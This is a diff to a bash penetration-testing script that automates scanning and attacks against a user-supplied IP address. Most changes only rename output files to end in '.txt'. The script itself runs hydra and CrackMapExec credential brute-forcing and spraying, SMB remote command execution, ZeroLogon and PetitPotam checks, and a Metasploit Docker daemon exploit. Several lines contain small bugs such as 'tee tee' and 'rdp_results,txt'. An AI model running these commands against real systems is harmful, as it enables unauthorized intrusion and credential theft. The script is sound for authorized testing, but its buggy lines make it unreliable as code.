@@ -15,25 +15,6 @@ RESET='\033[0m'
 
 RED_LINE="${RED}================================================================================${RESET}"
 
-# Tools Used:
-# - brutespray: Password spraying tool for various services
-#   Installation: sudo apt-get install brutespray
-
-# - httpx: Fast and multi-purpose HTTP toolkit
-#   Installation: go get -u github.com/projectdiscovery/httpx/cmd/httpx
-
-# - nuclei: Fast and customizable vulnerability scanner
-#   Installation: GO111MODULE=on go get -u -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei
-
-# - CrackMapExec (cme): Post-exploitation tool to automate the assessment of large Active Directory networks
-#   Installation: sudo apt-get install -y libssl-dev libffi-dev python-dev build-essential && sudo pip install cme
-
-# - SMBGhost: Tool to check for the SMBGhost vulnerability
-#   Installation: git clone https://github.com/ly4k/SMBGhost.git
-
-# Note: Ensure that Python3 and nmap are already installed on your system.
-# If not, you can install Python3 using your system's package manager, and nmap using: sudo apt-get install nmap
-
 # Set variables
 # Prompt user for target IP address
 read -p "Enter the target IP address (e.g., 10.0.2.13): " IP
@@ -77,14 +58,14 @@ echo -e $RED_LINE
   echo -e "${GREEN}|      Script Scan for 21,22,25     |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
   
-nmap --script "ftp-anon,ftp-vuln*,ftp-*" -p 21 "$IP" -oN $results_dir/ftp
-msfconsole -q -x "use auxiliary/scanner/ftp/anonymous ; spool $results_dir/ftp_msf; set rhosts $IP; set password anonymous; run ;spool off ; exit"
+nmap --script "ftp-anon,ftp-vuln*,ftp-*" -p 21 "$IP" -oN $results_dir/ftp.txt
+msfconsole -q -x "use auxiliary/scanner/ftp/anonymous ; spool $results_dir/ftp_msf.txt; set rhosts $IP; set password anonymous; run ;spool off ; exit"
 
 nmap --script ssh-* -p 22 "$IP" | tee $results_dir/ssh_results
-cme ssh "$IP" -u 'users.txt' -p 'password.txt' 2>&1  | tee -a $results_dir/ssh_results
-nmap -n --script "*telnet* and safe" -p 23 "$IP"  -oN $results_dir/telenet
-nmap --script "smtp-brute,smtp-commands,smtp-enum-users,smtp-ntlm-info,smtp-vuln-cve2011-1764,smtp-*" -p 25,465,587 --script-args smtp-ntlm-info.domain=example.com "$IP" | tee $results_dir/smtp
-nmap -sU --script "ntp-info,ntp-monlist,ntp*,ntp* and (discovery or vuln) and not (dos or brute)" -p 123 $IP | tee -a $results_dir/ntp
+cme ssh "$IP" -u 'users.txt' -p 'password.txt' 2>&1  | tee -a $results_dir/ssh_results.txt
+nmap -n --script "*telnet* and safe" -p 23 "$IP"  -oN $results_dir/telnet.txt
+nmap --script "smtp-brute,smtp-commands,smtp-enum-users,smtp-ntlm-info,smtp-vuln-cve2011-1764,smtp-*" -p 25,465,587 --script-args smtp-ntlm-info.domain=example.com "$IP" | tee $results_dir/smtp.txt
+nmap -sU --script "ntp-info,ntp-monlist,ntp*,ntp* and (discovery or vuln) and not (dos or brute)" -p 123 $IP | tee -a $results_dir/ntp.txt
 
 echo -e $RED_LINE
 
@@ -94,10 +75,10 @@ echo -e $RED_LINE
   echo -e "${GREEN}+-----------------------------------+${RESET}"
 
 # Find the Print System Remote Prototol or the Print System Asynchronous Remote Protocol
-impacket-rpcdump -port 135 $IP | grep -E 'MS-RPRN|MS-PAR' | tee -a $results_dir/MSRPC_overall_results
+impacket-rpcdump -port 135 $IP | grep -E 'MS-RPRN|MS-PAR' | tee -a $results_dir/MSRPC_overall_results.txt
 # rpcdump for dumping RPC endpoints
-impacket-rpcdump -port 135 $IP | tee -a $results_dir/MSRPC_overall_results
-nmap --script msrpc-enum -p 135 $IP | tee -a $results_dir/MSRPC_overall_results
+impacket-rpcdump -port 135 $IP | tee -a $results_dir/MSRPC_overall_results.txt
+nmap --script msrpc-enum -p 135 $IP | tee -a $results_dir/MSRPC_overall_results.txt
 
 echo -e $RED_LINE
 
@@ -123,29 +104,29 @@ echo -e $RED_LINE
   echo -e "${GREEN}|                                   |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
 
-nmap --script "smb-brute,smb-enum-shares.nse,smb-enum-users.nse,smb-enum*,smb-protocols,smb-vuln*" -p 445 $IP | tee $results_dir/SMB_overall_results
+nmap --script "smb-brute,smb-enum-shares.nse,smb-enum-users.nse,smb-enum*,smb-protocols,smb-vuln*" -p 445 $IP | tee $results_dir/SMB_overall_results.txt
 #-a Do all simple enumeration (users,shares,os,password policy,groups).
-enum4linux -a -v $IP | tee -a $results_dir/SMB_overall_results
+enum4linux -a -v $IP | tee -a $results_dir/SMB_overall_results.txt
 # -M zerologon: Scan for ZeroLogon
 # -M petitpotam: Scan for PetitPotam
-netexec smb $IP -u '' -p '' -M zerologon -M petitpotam | tee -a $results_dir/SMB_overall_results
+netexec smb $IP -u '' -p '' -M zerologon -M petitpotam | tee -a $results_dir/SMB_overall_results.txt
 # Recursive
-smbmap -H $IP -R | tee -a $results_dir/SMB_overall_results
+smbmap -H $IP -R | tee -a $results_dir/SMB_overall_results.txt
 # -N: No password
 # -L: List shared directories
-smbclient -N -L $results_dir/list_hosts | tee -a $results_dir/SMB_overall_results
+smbclient -N -L $results_dir/list_hosts | tee -a $results_dir/SMB_overall_results.txt
 # Execute a command
-smbmap -u username -p password --host-file $results_dir/list_hosts -x 'ipconfig' | tee -a $results_dir/SMB_overall_results
+smbmap -u username -p password --host-file $results_dir/list_hosts -x 'ipconfig' | tee -a $results_dir/SMB_overall_results.txt
 # Find aother user
-crackmapexec smb $IP -u username -p password --users | tee -a $results_dir/SMB_overall_results
-crackmapexec smb $IP -u users.txt -p password --continue-on-success | tee -a $results_dir/SMB_overall_results
+crackmapexec smb $IP -u username -p password --users | tee -a $results_dir/SMB_overall_results.txt
+crackmapexec smb $IP -u users.txt -p password --continue-on-success | tee -a $results_dir/SMB_overall_results.txt
 #Perform RID cycling attack against a DC with SMB null sessions allowed with impacket-lookupsid
 # Anonymous logon
 # 20000: Maximum RID to be cycled
-#impacket-lookupsid example.local/user@$IP 20000 | tee -a $results_dir/SMB_overall_results
-#crackmapexec smb $IP -u <username> -H hashes.txt | tee -a $results_dir/SMB_overall_results
+#impacket-lookupsid example.local/user@$IP 20000 | tee -a $results_dir/SMB_overall_results.txt
+#crackmapexec smb $IP -u <username> -H hashes.txt | tee -a $results_dir/SMB_overall_results.txt
 #Null scan for smb shares
-cme smb "$IP" -u '' -p '' --shares | tee -a $results_dir/SMB_overall_results
+cme smb "$IP" -u '' -p '' --shares | tee -a $results_dir/SMB_overall_results.txt
 
 echo -e $RED_LINE
 
@@ -154,11 +135,11 @@ echo -e $RED_LINE
   echo -e "${GREEN}|                                   |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
 
-nmap --script "ldap-brute,ldap-search,ldap-* and not brute" --script-args "ldap.base='cn=users,dc=cqure,dc=net'" -p 389 $IP | tee $results_dir/LDAP_overall_results
+nmap --script "ldap-brute,ldap-search,ldap-* and not brute" --script-args "ldap.base='cn=users,dc=cqure,dc=net'" -p 389 $IP | tee $results_dir/LDAP_overall_results.txt
 # -k: Use Kerberos authentication
-netexec ldap $IP -u usernames.txt -p '' -k | tee -a $results_dir/LDAP_overall_results
+netexec ldap $IP -u usernames.txt -p '' -k | tee -a $results_dir/LDAP_overall_results.txt
 # --trusted-for-delegation: Enumerate computers and users with the flag `TRUSTED_FOR_DELEGATION`
-netexec ldap $IP -u username -p password --trusted-for-delegation | tee -a $results_dir/LDAP_overall_results
+netexec ldap $IP -u username -p password --trusted-for-delegation | tee -a $results_dir/LDAP_overall_results.txt
 
 echo -e $RED_LINE
 
@@ -167,8 +148,8 @@ echo -e $RED_LINE
   echo -e "${GREEN}|                                   |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
   
-nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $IP | tee $results_dir/mssql_results
-cme mssql "$IP" -u 'users.txt' -p 'password.txt' 2>&1  | tee -a $results_dir/mssql_results
+nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $IP | tee $results_dir/mssql_results.txt
+cme mssql "$IP" -u 'users.txt' -p 'password.txt' 2>&1  | tee -a $results_dir/mssql_results.txt
 
 echo -e $RED_LINE
 
@@ -177,7 +158,7 @@ echo -e $RED_LINE
   echo -e "${GREEN}|                                   |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
   
-nmap --script "mysql-info,mysql-enum,mysql-brute,mysql-databases,mysql-users,mysql-*" -p 3306 $IP | tee tee $results_dir/mysql_results
+nmap --script "mysql-info,mysql-enum,mysql-brute,mysql-databases,mysql-users,mysql-*" -p 3306 $IP | tee tee $results_dir/mysql_results.txt
 
 echo -e $RED_LINE
 
@@ -186,8 +167,8 @@ echo -e $RED_LINE
   echo -e "${GREEN}|                                   |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
   
-nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 $IP | tee tee $results_dir/apache_ajp_results
-msfconsole -q -x "use auxiliary/admin/http/tomcat_ghostcat; spool $results_dir/apache_ajp_msf; set rhosts $IP; run ;spool off ; exit"
+nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 $IP | tee tee $results_dir/apache_ajp_results.txt
+msfconsole -q -x "use auxiliary/admin/http/tomcat_ghostcat; spool $results_dir/apache_ajp_msf.txt; set rhosts $IP; run ;spool off ; exit"
 
 
 echo -e $RED_LINE
@@ -197,9 +178,9 @@ echo -e $RED_LINE
   echo -e "${GREEN}|                                   |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
   
-nmap --script "rdp-enum-encryption,rdp-ntlm-info,rdp*" -p 3389 $IP | tee $results_dir/rdp_results
+nmap --script "rdp-enum-encryption,rdp-ntlm-info,rdp*" -p 3389 $IP | tee $results_dir/rdp_results.txt
 #Brute Force Credentials
-hydra -l username -P passwords.txt $IP rdp | tee -a tee $results_dir/rdp_results
+hydra -l username -P passwords.txt $IP rdp | tee -a tee $results_dir/rdp_results.txt
 
 echo -e $RED_LINE
 
@@ -208,11 +189,11 @@ echo -e $RED_LINE
   echo -e "${GREEN}|                                   |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
   
-nmap -sU --script "snmp-info,snmp-interfaces,snmp-processes,snmp-sysdescr,snmp*" -p 161 $IP | tee  $results_dir/snmp
+nmap -sU --script "snmp-info,snmp-interfaces,snmp-processes,snmp-sysdescr,snmp*" -p 161 $IP | tee  $results_dir/snmp.txt
 #Brute Force the Community Names
-hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP snmp |  tee -a $results_dir/snmp
+hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP snmp |  tee -a $results_dir/snmp.txt
 #Snmp-Check is SNMP enumerator
-snmp-check $IP -p 161 -c public | tee -a $results_dir/snmp
+snmp-check $IP -p 161 -c public | tee -a $results_dir/snmp.txt
 
 echo -e $RED_LINE
 
@@ -220,7 +201,7 @@ echo -e $RED_LINE
   echo -e "${GREEN}|  Scanning for NFS  TEST CASES     |${RESET}"
   echo -e "${GREEN}|                                   |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
-nmap --script=nfs-ls,nfs-statfs,nfs-showmount -p 111,2049 $IP | tee tee $results_dir/nfs_results
+nmap --script=nfs-ls,nfs-statfs,nfs-showmount -p 111,2049 $IP | tee tee $results_dir/nfs_results.txt
 
 echo -e $RED_LINE
 
@@ -228,8 +209,8 @@ echo -e $RED_LINE
   echo -e "${GREEN}|  Scanning for VNC TEST CASES     |${RESET}"
   echo -e "${GREEN}|                                   |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
-nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p '5800,5801,5900,5901' $IP | tee  $results_dir/vnc_results
-msfconsole -q -x "use auxiliary/scanner/vnc/vnc_none_auth; spool $results_dir/vncmsf; set rhosts $IP; run ;spool off ; exit"
+nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p '5800,5801,5900,5901' $IP | tee  $results_dir/vnc_results.txt
+msfconsole -q -x "use auxiliary/scanner/vnc/vnc_none_auth; spool $results_dir/vncmsf.txt; set rhosts $IP; run ;spool off ; exit"
 
 echo -e $RED_LINE
 
@@ -238,7 +219,7 @@ echo -e $RED_LINE
   echo -e "${GREEN}|                                   |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
 #PORT 2375, 2376 Pentesting Docker
-nmap -sV --script "docker-*" -p 2375,2376 $IP  | tee  $results_dir/docker_Results
+nmap -sV --script "docker-*" -p 2375,2376 $IP  | tee  $results_dir/docker_Results.txt
 msfconsole -q -x "use exploit/linux/http/docker_daemon_tcp; spool $results_dir/docker_Results; set rhost $IP; run; spool off ; exit"
 
   echo -e "${GREEN}+-----------------------------------+${RESET}"
@@ -246,10 +227,10 @@ msfconsole -q -x "use exploit/linux/http/docker_daemon_tcp; spool $results_dir/d
   echo -e "${GREEN}|                                   |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
 #5432,5433 - Postgresql
-nmap --script pgsql-brute -p 5432 $IP |  tee  $results_dir/Postgresql
+nmap --script pgsql-brute -p 5432 $IP |  tee  $results_dir/Postgresql.txt
 #Brute Force Credentials
-hydra -l username -P passwords.txt $IP postgres |  tee -a  $results_dir/Postgresql
-hydra -L usernames.txt -p password $IP postgres |  tee -a $results_dir/Postgresql
+hydra -l username -P passwords.txt $IP postgres |  tee -a  $results_dir/Postgresql.txt
+hydra -L usernames.txt -p password $IP postgres |  tee -a $results_dir/Postgresql.txt
 
 echo -e $RED_LINE
 
@@ -259,7 +240,7 @@ echo -e $RED_LINE
   echo -e "${GREEN}+-----------------------------------+${RESET}"
 
 echo "$IP" | httpx -p '80,81,82,90,443,444,446,447,448,449,450,451,1947,5000,5800,8000,8443,8080,8081,8089,8888,1072,1556,1947,2068,2560,3128,3172,3387,3580,3582,3652,4343,4480,5000, 
-5800,5900,5985,5986,8001,8030,8082,8083,8088,8089,8090,8443,8444,8445,8910,9001,9090,9091,20000' --title | tee $results_dir/httpxresults
+5800,5900,5985,5986,8001,8030,8082,8083,8088,8089,8090,8443,8444,8445,8910,9001,9090,9091,20000' --title | tee $results_dir/httpxresults.txt
 
 echo -e $RED_LINE
 
@@ -268,7 +249,7 @@ echo -e $RED_LINE
   echo -e "${GREEN}|           web service             |${RESET}"
   echo -e "${GREEN}|                                   |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
-cat nmap_tcp_scan.xml | nmapurls | tee nmap_webservice_results
+cat nmap_tcp_scan.xml | nmapurls | tee nmap_webservice_results.txt
 
 echo -e $RED_LINE
 
@@ -277,7 +258,7 @@ echo -e $RED_LINE
   echo -e "${GREEN}|                                   |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
 
-cat $results_dir/httpxresults | nuclei | tee $results_dir/nucleiresults
+cat $results_dir/httpxresults | nuclei | tee $results_dir/nucleiresults.txt
 
 echo -e $RED_LINE
 
@@ -287,7 +268,7 @@ echo -e $RED_LINE
   echo -e "${GREEN}|                                   |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
 
-cme smb "$IP" | tee $results_dir/smb_results
+cme smb "$IP" | tee $results_dir/smb_results.txt
 
 echo -e $RED_LINE
 
@@ -297,7 +278,7 @@ echo -e $RED_LINE
   echo -e "${GREEN}|                                   |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
 
-awk '/smbv1: true/{print $1, $4}' smb_results | tee $results_dir/smbv1_ips
+awk '/smbv1: true/{print $1, $4}' smb_results | tee $results_dir/smbv1_ips.txt
 
 echo -e $RED_LINE
 
@@ -306,7 +287,7 @@ echo -e $RED_LINE
   echo -e "${GREEN}|    false IPs...                   |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
 
-awk '/signing: false/{print $1, $4}' smb_results | tee $results_dir/smbsigning_ips
+awk '/signing: false/{print $1, $4}' smb_results | tee $results_dir/smbsigning_ips.txt
 
 echo -e $RED_LINE
 
@@ -314,7 +295,7 @@ echo -e $RED_LINE
   echo -e "${GREEN}|   Extracting Windows              |${RESET}"
   echo -e "${GREEN}|    version information...         |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
-awk '{print $3}' smb_results | tee $results_dir/windows_version
+awk '{print $3}' smb_results | tee $results_dir/windows_version.txt
 
 echo -e $RED_LINE
 
@@ -324,7 +305,7 @@ echo -e $RED_LINE
   echo -e "${GREEN}|                                   |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
 
-python3 $HOME/tools/brutespray/brutespray.py --file $results_dir/nmap_tcp_scan.gnmap -U /usr/share/wordlist/user.txt -P /usr/share/wordlist/pass.txt -c -o password_spray_results
+python3 $HOME/tools/brutespray/brutespray.py --file $results_dir/nmap_tcp_scan.gnmap -U /usr/share/wordlist/user.txt -P /usr/share/wordlist/pass.txt -c -o $results_dir/password_spray_results.txt
 
 echo -e $RED_LINE
 
@@ -332,7 +313,7 @@ echo -e $RED_LINE
   echo -e "${GREEN}|  Checking for BlueKeep            |${RESET}"
   echo -e "${GREEN}|     vulnerability...              |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
-python3 $HOME/tools/bluekeep.py "$IP" | tee -a $results_dir/rdp_results
+python3 $HOME/tools/bluekeep.py "$IP" | tee -a $results_dir/rdp_results,txt
 
 echo -e $RED_LINE
 
@@ -340,7 +321,7 @@ echo -e $RED_LINE
   echo -e "${GREEN}|  Checking for SMBGhost            |${RESET}"
   echo -e "${GREEN}|     vulnerability...              |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
-python3  $HOME/tools/SMBGhost/scanner.py "$IP" | tee -a $results_dir/smbghost
+python3  $HOME/tools/SMBGhost/scanner.py "$IP" | tee -a $results_dir/smbghost.txt
 
 echo -e $RED_LINE
 
